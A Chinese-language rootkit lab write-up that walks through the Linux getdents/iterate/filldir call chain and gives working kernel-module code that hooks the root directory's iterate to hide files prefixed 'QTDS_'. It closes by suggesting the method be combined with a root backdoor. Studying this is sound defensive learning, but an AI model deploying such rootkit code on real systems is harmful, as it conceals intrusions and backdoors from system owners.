---
category: Sec
title: Linux Rootkit 实验 | 00022 Rootkit 基本功能实现x隐藏文件
---

# Linux Rootkit 实验 | 00022 Rootkit 基本功能实现x隐藏文件

## 实验说明

本次实验将初步实现 rootkit 的基本功能：

- 阻止其他内核模块加载
- 提供 root 后门
- 隐藏文件
- 隐藏进程
- 隐藏端口
- 隐藏内核模块

本次实验基于 0001 实验中学习的挂钩技术。

注：由于本次实验内容过多，故分为`00020`到`00025`六个实验报告分别讲解。

**本节实现“隐藏文件”功能**

## 实验环境

```
uname -a:
Linux kali 4.6.0-kali1-amd64 #1 SMP Debian 4.6.4-1kali1 (2016-07-21) x86_64 GNU/Linux

GCC version:6.1.1
```

上述环境搭建于虚拟机，另外在没有特殊说明的情况下，均以 root 权限执行。

**注：后面实验参考的是4.10.10的源码**

## 实验过程

### 隐藏文件

我们要了解文件遍历的实现，才能够理解隐藏文件的思路。文件遍历主要通过是系统调用`getdents`和`getdents64`实现，它们的作用是获取目录项。

我们先看一下`getdents`的`man page`：

```
int getdents(unsigned int fd, struct linux_dirent *dirp,
            unsigned int count);

/* The system call getdents() reads several linux_dirent structures from the directory referred to by the open file descriptor fd into the buffer pointed to by dirp.  The argument count specifies the size of that buffer. */
```

我们跟进看一下`struct linux_dirent`：

{% highlight c %}
struct linux_dirent {
	unsigned long	d_ino; /* Inode number */
	unsigned long	d_off; /* Offset to next linux_dirent */
	unsigned short	d_reclen; /* Length of this linux_dirent */
	char		d_name[1];
};
{% endhighlight %}

我们看一下`getdents`系统调用的定义：

{% highlight c %}
// fs/readdir.c
SYSCALL_DEFINE3(getdents, unsigned int, fd,
		struct linux_dirent __user *, dirent, unsigned int, count)
{
	struct fd f;
	struct linux_dirent __user * lastdirent;
	struct getdents_callback buf = {
		.ctx.actor = filldir,
		.count = count,
		.current_dir = dirent
	};
    ...
	error = iterate_dir(f.file, &buf.ctx);
    ...
}
{% endhighlight %}

其中`filldir`作为回调函数，用于把一项记录（如一个目录下的文件或目录）填到返回的缓冲区里。而`iterate_dir`则是经过若干层次后调用`filldir`。

跟进`iterate_dir`：

{% highlight c %}
// fs/readdir.c
int iterate_dir(struct file *file, struct dir_context *ctx)
{
	...
	if (!IS_DEADDIR(inode)) {
		ctx->pos = file->f_pos;
		if (shared) // 这里，通过 iterate_shared 调用了回调函数
			res = file->f_op->iterate_shared(file, ctx);
		else // 这里，通过 iterate 调用了回调函数
			res = file->f_op->iterate(file, ctx);
		file->f_pos = ctx->pos;
		fsnotify_access(file);
		file_accessed(file);
	}
    ...
}
{% endhighlight %}

跟进看一下`iterate`：

{% highlight c %}
// include/linux/fs.h
struct file_operations {
	...
	int (*iterate) (struct file *, struct dir_context *);
	int (*iterate_shared) (struct file *, struct dir_context *);
	...
};
{% endhighlight %}

我们暂时不管`iterate`与`iterate_shared`的区别。这正是我们在`0001`实验中提过的`file_operations`。与`0001`相同，我们要钩掉这里原本的`iterate`或者`iterate_shared`。

跟进一下`dir_context`：

{% highlight c %}
// include/linux/fs.h
struct dir_context;
typedef int (*filldir_t)(struct dir_context *, const char *, int, loff_t, u64, unsigned);
struct dir_context {
	const filldir_t actor;
	loff_t pos;
};
{% endhighlight %}

这个`actor`正是之前的`filldir`。现在还**缺一环**这个调用链就完整了，即，`iterate`只是`file_operations`结构体中的一个函数指针成员，它在哪里完成了初始化呢（即它指向的默认的`iterate`函数的具体的代码在哪里呢）？对于不同文件系统有不同的实现，我们以`ext4`为例：

{% highlight c %}
// fs/ext4/dir.c
const struct file_operations ext4_dir_operations = {
	.llseek		= ext4_dir_llseek,
	.read		= generic_read_dir,
	.iterate_shared	= ext4_readdir,
	.unlocked_ioctl = ext4_ioctl,
#ifdef CONFIG_COMPAT
	.compat_ioctl	= ext4_compat_ioctl,
#endif
	.fsync		= ext4_sync_file,
	.open		= ext4_dir_open,
	.release	= ext4_release_dir,
};
{% endhighlight %}

可以看到，`ext4`并没有用`iterate`，而是用了`iterate_shared`成员。我们跟进看一下`ext4_readdir`：

{% highlight c %}
// fs/ext4/dir.c
static int ext4_readdir(struct file *file, struct dir_context *ctx)
{
	...
	if (is_dx_dir(inode)) {
		err = ext4_dx_readdir(file, ctx);
		...
	}
	...
}

static int ext4_dx_readdir(struct file *file, struct dir_context *ctx)
{
	...
    	if (call_filldir(file, ctx, fname))
	...
}

/*
 * This is a helper function for ext4_dx_readdir.  It calls filldir
 * for all entres on the fname linked list.  (Normally there is only
 * one entry on the linked list, unless there are 62 bit hash collisions.)
 */
static int call_filldir(struct file *file, struct dir_context *ctx,
			struct fname *fname)
{
	...
	while (fname) {
		if (!dir_emit(ctx, fname->name,
				fname->name_len,
				fname->inode,
				get_dtype(sb, fname->file_type))) {
			info->extra_fname = fname;
			return 1;
		}
		fname = fname->next;
	}
    ...
}

static inline bool dir_emit(struct dir_context *ctx,
			    const char *name, int namelen,
			    u64 ino, unsigned type)
{
	return ctx->actor(ctx, name, namelen, ctx->pos, ino, type) == 0;
}
{% endhighlight %}

这一部分真的是很复杂，还涉及到了红黑树。总之追踪到最后，我们可以看到在`dir_emit`中调用了`ctx->actor`，即`filldir`。

OK。最后一环也有了，我们看`filldir`：

{% highlight c %}
// fs/readdir.c
static int filldir(struct dir_context *ctx, const char *name, int namlen,
		   loff_t offset, u64 ino, unsigned int d_type)
{
	...
}
{% endhighlight %}

正主是上面这位。现在思路已经形成了：首先钩掉`iterate`，再把我们的`iterate`中`actor`设定为我们自己的`filedir`。`filedir`很复杂，我们把自己的`filedir`做成仅仅给真正的`filedir`加层壳，把我们想要过滤掉的文件名过滤掉（不传给真正的`filedir`），把其他的正常传给`filedir`处理，再经由我们返回即可。

我们只需要替换掉根目录`/`的`iterate`即可。

**下面开工啦！**

首先给出我们的假`iterate`和假`filldir`：

{% highlight c %}
int (*real_iterate)(struct file *, struct dir_context *); 
int (*real_filldir)(struct dir_context *, const char *, int, \
                    loff_t, u64, unsigned);
int fake_iterate(struct file *filp, struct dir_context *ctx)
{
    // 备份真的 ``filldir``，以备后面之需。
    real_filldir = ctx->actor;

    // 把 ``struct dir_context`` 里的 ``actor``，
    // 也就是真的 ``filldir``
    // 替换成我们的假 ``filldir``
    *(filldir_t *)&ctx->actor = fake_filldir;

    return real_iterate(filp, ctx);
}
#define SECRET_FILE "QTDS_"
int fake_filldir(struct dir_context *ctx, const char *name, int namlen,
             loff_t offset, u64 ino, unsigned d_type)
{
    if (strncmp(name, SECRET_FILE, strlen(SECRET_FILE)) == 0) {
        // 如果是需要隐藏的文件，直接返回，不填到缓冲区里。
        printk("Hiding: %s", name);
        return 0;
    }
    // 如果不是需要隐藏的文件，
    // 交给的真的 ``filldir`` 把这个记录填到缓冲区里。
    return real_filldir(ctx, name, namlen, offset, ino, d_type);
}
{% endhighlight %}

接着是一个宏，用来替换某个目录下的`iterate`

{% highlight c %}
#define set_f_op(op, path, new, old)    \
    do{                                 \
        struct file *filp;              \
        struct file_operations *f_op;   \
        printk("Opening the path: %s.\n", path);    \
        filp = filp_open(path, O_RDONLY, 0);        \
        if(IS_ERR(filp)){                           \
            printk("Failed to open %s with error %ld.\n",   \
                path, PTR_ERR(filp));                       \
            old = NULL;                                     \
        }                                                   \
        else{                                               \
            printk("Succeeded in opening: %s.\n", path);    \
            f_op = (struct file_operations *)filp->f_op;    \
            old = f_op->op;                                 \
            printk("Changing iterate from %p to %p.\n",     \
                    old, new);                              \
            disable_write_protection();                     \
            f_op->op = new;                                 \
            enable_write_protection();                      \
        }                                                   \
    }while(0)
{% endhighlight %}

开关写保护的函数请参考`0001`实验。最后是入口出口函数中添加的内容：

{% highlight c %}
#define ROOT_PATH "/"
// in init
set_f_op(iterate, ROOT_PATH, fake_iterate, real_iterate);

if(!real_iterate){
    return -ENOENT;
}
// in exit
if(real_iterate){
    void *dummy;
    set_f_op(iterate, ROOT_PATH, real_iterate, dummy);
}
{% endhighlight %}

可以看到，这里我们替换的是`iterate`而非`iterate_shared`。因为实验环境是`4.6.0`内核，大家可以找`4.6.0`的代码看，它使用了`iterate`而非`iterate_shared`，但是到`4.10.0`就是`iterate_shared`了。这也引出了 rootkit 兼容性的问题，这些内核版本差异的细枝末节实在太多了，这个话题先到此为止。

在我们的设定里，所有以`QTDS_`为前缀的文件都会被隐藏（QTDS = “齐天大圣”）。

测试结果如下：

首先，我们加载`fileHid`模块：

![]({{ site.url }}/images/LinuxRootkits/linux-rkt-11.png)

接着创建`hello`文件，可以看到，`hello`文件正常显示。我们把`hello`更名为`QTDS_hello`，这时再`ls`，发现文件消失，且`dmesg`中有我们设定的打印语句：

![]({{ site.url }}/images/LinuxRootkits/linux-rkt-12.png)

![]({{ site.url }}/images/LinuxRootkits/linux-rkt-13.png)

此时只是用户看不到文件而已，但如果知道文件名，还是可以对它操作：

![]({{ site.url }}/images/LinuxRootkits/linux-rkt-14.png)

这时如果卸载模块，则文件又会显现出来：

![]({{ site.url }}/images/LinuxRootkits/linux-rkt-15.png)

![]({{ site.url }}/images/LinuxRootkits/linux-rkt-16.png)

日志则会记录`iterate`的改变：

![]({{ site.url }}/images/LinuxRootkits/linux-rkt-17.png)

**将“提供 root 后门”环节和本环节的方法结合，就可以做出隐藏的 root 后门。**

## 参考资料

- [4.6.0 linux/fs/ext4/dir.c](http://elixir.free-electrons.com/linux/v4.6/source/fs/ext4/dir.c)
